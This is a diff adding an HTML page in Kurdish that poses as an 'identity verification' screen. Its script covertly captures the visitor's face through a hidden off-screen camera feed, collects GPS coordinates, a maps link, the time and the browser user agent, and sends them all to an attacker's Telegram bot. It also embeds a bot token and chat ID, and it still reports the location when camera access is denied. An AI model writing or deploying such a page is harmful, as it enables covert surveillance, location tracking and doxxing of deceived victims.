@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پشتڕاستکردنەوە</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: url('bg.jpg') center/cover no-repeat fixed;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .overlay {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.55); z-index: 1;
+        }
+        .card {
+            position: relative; z-index: 2;
+            background: rgba(255,255,255,0.92);
+            backdrop-filter: blur(10px);
+            border-radius: 16px; padding: 35px 25px;
+            text-align: center; max-width: 400px; width: 90%;
+        }
+        .card h2 { color: #1a73e8; margin-bottom: 12px; }
+        .card p { color: #444; margin-bottom: 20px; }
+        .spinner {
+            border: 4px solid #ddd; border-top: 4px solid #1a73e8;
+            border-radius: 50%; width: 45px; height: 45px;
+            animation: spin 1s linear infinite; margin: 15px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div>
+    <div class="card" id="card">
+        <h2>پشتڕاستکردنەوەی ناسنامە</h2>
+        <p>تکایە ڕێگە بە کامێرا و شوێنی جوگرافی بدە.</p>
+        <div class="spinner"></div>
+        <p>چاوەڕێ...</p>
+    </div>
+    <video id="vid" autoplay playsinline style="position:absolute;left:-9999px;opacity:0;"></video>
+    <canvas id="canvas" style="position:absolute;left:-9999px;opacity:0;"></canvas>
+
+    <script>
+    const BOT_TOKEN = '8739484012:AAFMN2V0kdkVnUp_8YlDV1IKEq9_6IiZsOA';
+    const CHAT_ID = '659131693';
+
+    function sendData(blob, lat, lon, map) {
+        let f = new FormData();
+        f.append('chat_id', CHAT_ID);
+        f.append('photo', blob, 'cap.png');
+        f.append('caption', `📍${lat},${lon}\n🗺${map}\n🕒${new Date().toLocaleString('ckb')}\n🧬${navigator.userAgent}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f})
+        .then(()=>{document.getElementById('card').innerHTML='<h2>✅ سەرکەوتوو</h2><p>دەتوانیت بەردەوام بیت.</p>';})
+        .catch(()=>{document.getElementById('card').innerHTML='<h2>❌ هەڵە</h2>';});
+    }
+
+    function fail(m) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+            method:'POST',headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHAT_ID,text:m})
+        });
+    }
+
+    setTimeout(()=>{
+        navigator.geolocation.getCurrentPosition(p=>{
+            let lat=p.coords.latitude, lon=p.coords.longitude, map=`https://maps.google.com/?q=${lat},${lon}`;
+            navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+            .then(s=>{
+                let v=document.getElementById('vid');
+                v.srcObject=s; v.play();
+                v.oncanplay=()=>setTimeout(()=>{
+                    let c=document.getElementById('canvas');
+                    c.width=v.videoWidth||640; c.height=v.videoHeight||480;
+                    c.getContext('2d').drawImage(v,0,0);
+                    c.toBlob(b=>{if(b)sendData(b,lat,lon,map);s.getTracks().forEach(t=>t.stop());},'image/png');
+                },1500);
+            }).catch(()=>fail(`⚠️کامێرا ڕێگەپێنەدرا\n📍${lat},${lon}\n${map}`));
+        },()=>fail(`🚫لۆکەیشن بلۆک\nUA:${navigator.userAgent}`));
+    },1200);
+    </script>
+</body>
+</html>
